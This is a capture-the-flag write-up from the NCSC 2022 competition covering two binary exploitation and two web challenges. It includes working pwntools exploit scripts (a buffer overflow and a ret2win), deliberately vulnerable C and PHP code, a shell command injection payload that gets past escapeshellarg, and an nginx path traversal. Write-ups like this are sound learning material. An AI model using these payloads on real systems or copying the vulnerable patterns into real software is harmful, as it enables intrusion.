# National Cyber Security Congress

NCSC, organized by Securinets, hosted an 8 hours CTF, started the 29th of January at 23:00 (GMT +1). <br/>
I've participated in the CTF with [Aziz Zribi](https://www.facebook.com/Aziz.Zribi.Z), [Zakaria Soussi](https://www.facebook.com/zakaria.soussi.12) & [Anas Chaibi](https://www.facebook.com/chanas07) as a team. We ranked the 7th out of 52 teams.

<br/>
<hr>

* ### Binary exploitation

  #### 1. Babypwn
    That's a pretty basic challenge, here is the source code:
    <details>
    <summary>Show</summary>

    ```C
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    void init_buffering() {
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
    }
    int main(){
      int x = 0x41414141;
      char name[20];
      init_buffering(); // ignore this line
      puts("what's your name ?");
      gets(name);
      if(x != 0x41414141) {
        execve("/bin/sh", 0, 0);
      }
      return 0;
    }
    ```
    </details>

    We only need to overwrite `x` value in memory so we can just send a payload long enough to overwrite it. Here is a script for this challenge:

    <details>
    <summary>Show</summary>

    ```python
    from pwn import *

    # nc 52.188.108.186 1239
    conn = remote('52.188.108.186',1239)

    conn.send(b'azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccv' )

    conn.interactive()
    ```
    </details>

    And we get our shell & flag.

    <p align="center">
    <img src="/2022/NCSC/img/babyflag.png"><br/>
    </p>

  #### 2. Babypwn
    For this challenge, we get our source code:
    <details>
    <summary>Show</summary>

    ```C
    #include<stdio.h>
    #include<stdlib.h>
    #include<string.h>
    void win(){
      execve("/bin/sh", 0, 0);
    }
    void strip(char *format) {
      format[strcspn(format, "\n")] = 0;
    }
    void init_buffering() {
      setvbuf(stdout, NULL, _IONBF, 0);
      setvbuf(stdin, NULL, _IONBF, 0);
      setvbuf(stderr, NULL, _IONBF, 0);
    }
    int main(){
      init_buffering();
      puts("Freedom is all I want! you are free to choose your format specifier !");
      char buffer[60];
      char format[20];
      printf("> ");
      read(0, format, 20);
      strip(format);
      puts("Now, do what you want!");
      scanf(format,buffer);
      puts("good bye !");
      return 0;
    }
    ```
    </details>
    That's a ret2win, we have control on the `scanf`'s format & we'll be writing into `buffer`. We start gdb to do some tests, you can find the binary [here](https://github.com/M0ngi/CTF-Writeups/blob/main/2022/NCSC/pwn/freedom). We need to get our win address.

    <p align="center">
      <img src="/2022/NCSC/img/freedomgdb.png"><br/>
    </p>

    Now, we need to get the length of our payload. Since we have control over the format, we'll be reading a string using `%s` & we'll use this pattern: `azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccvvbbnn`.

    <p align="center">
      <img src="/2022/NCSC/img/freedomgdb2.png"><br/>
    </p>

    And we get a segmentation fault:

    <p align="center">
      <img src="/2022/NCSC/img/freedomgdb3.png"><br/>
    </p>

    Our RIP: `0x6e6e626276 ('vbbnn')`, we now know the proper payload to change the RIP: `azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccv`

    Now we got everything we need for the exploit, here is our script:

    <details>
    <summary>Show</summary>

    ```python
    from pwn import *

    # nc 52.188.108.186 1237
    conn = remote('52.188.108.186',1237)

    conn.send('%s')
    conn.send(b'azertyuiopqsdfghjklmwxcvbnaazzeerrttyyuuiiooppmmllkkjjhhggffddsqqwwxxccv' + p64(0x00000000004011f6))

    conn.interactive()
    ```
    </details>

    And our flag is `Securinets{d4ce75b4a536228bfc8371bfba2fdd45}`

* ### Web
  #### 1.  Broken Pingyy 
    For this challenge, we get the source code:
    <details>
    <summary>Show</summary>

    ```python
    <?php
    if(isset($_POST['ip'])){
      $cmd=$_POST['ip'];
      $clean=escapeshellarg($cmd);
      if($output = shell_exec("bash -c 'ping -c1 -w3 $clean" ))
        echo "<pre>$output</pre>";
      else
        echo "an error has occurred !";
    }
    ?>
    ```
    </details>

    And a link to this page:

    <p align="center">
      <img src="/2022/NCSC/img/webpingy.png"><br/>
    </p>

    If we use `www.google.com` as an input, we'll get ` an error has occurred ! `, Let's have a look at the code.

    As a start, we notice that we have a missing `'` at the end of `shell_exec("bash -c 'ping -c1 -w3 $clean" )` which caused our error. Also we are using `escapeshellarg`, a quick lookup in php documentation gives the following: (Ref)[https://www.php.net/manual/en/function.escapeshellarg.php]

    ```
    escapeshellarg() adds single quotes around a string and quotes/escapes any existing single quotes
    ```
    which means that our `$clean` variable should have a closing quote! Let's visualize this with an example, if we use `payload` as an input, saved in `$cmd`, after `escapeshellarg` we should have `$clean` equal to `'payload'` which means, `shell_exec` will be executed with `bash -c 'ping -c1 -w3 'payload'`. Therefor, if we escape the last quote & start our payload with a `;`, we should have `bash -c 'ping -c1 -w3 ';payload\'`. We'll be able to inject shell commands in our payload but we'll have to make use of the last quote to avoid getting an error, we can include an `;echo ` at the end of our payload to simply show that quote & avoid any errors. 
      
    Our final payload should look like this: `;cmd;echo \` which will result in executing `cmd` & that's our shell! Now we can try to get the content of `/flag` using `;cat /flag;echo \` as a payload & we get our flag!

    <p align="center">
      <img src="/2022/NCSC/img/webpingyflag.png"><br/>
    </p>
      
  #### 2.  Welcome To Web Universe
    
    For this challenge, we get a zip with the source code [Link](/2022/NCSC/Welcome%20To%20Web%20Universe)

    And a link to an empty page that contains `Everything is good afaik`.
      
    Looking at the source code, we know that we have a flask web server, if we examine the [main.py](/2022/NCSC/Welcome%20To%20Web%20Universe/src/main.py) we see that we have 2 routes, `/v1/status` & `/flag`, we'll be aiming for the flag route. If we check the link we got, we can see that we are in `/leetstatus`, this looks weird.
      
    Digging more into the files given, if we check the configuration file located in [nginx](/2022/NCSC/Welcome%20To%20Web%20Universe/nginx), we find this configuration
    
    ```config
    server {
      listen 80;
      server_name welcome.task;

      location /leet {
        proxy_pass http://api:5000/v1/;
      }

      access_log off;
      error_log /var/log/nginx/error.log error;
    }
    ```
      
    I don't have any knowledge about this kind of servers but looking at the `location` section, we can be redirecting `/leet` to our api's route `/v1/`. As if we are saying that `/leet` is replaced by `/v1/`, which makes sense because our current route `/leetstatus` will become `/v1/status` ! Now we want to navigate to our `/flag` route, we can use `/leet../flag` which will be transformed into `/flag` & we get our flag: 
      
    `Securinets{Nginx_Is_NoT_ThaT_GooD_AftER_All}`
